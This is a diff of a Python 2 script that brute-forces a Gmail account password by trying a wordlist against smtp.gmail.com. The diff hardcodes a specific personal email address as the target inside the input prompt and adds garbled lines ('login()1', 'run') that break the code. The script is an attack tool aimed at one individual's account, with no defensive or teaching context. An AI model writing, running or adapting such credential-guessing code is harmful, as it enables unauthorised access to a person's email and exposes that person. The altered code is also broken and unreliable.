@@ -48,7 +48,7 @@ pass_file = open(file_path,'r')
 pass_list = pass_file.readlines()
 def login():
     i = 0
-    user_name = raw_input('target email :')
+    user_name = raw_input('target email :yvonne.king2@ntlworld.com')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
     for password in pass_list:
@@ -71,4 +71,6 @@ def login():
             break
          else:
             print '[!] password not found => ' + password
-login()
+login()1
+run
+
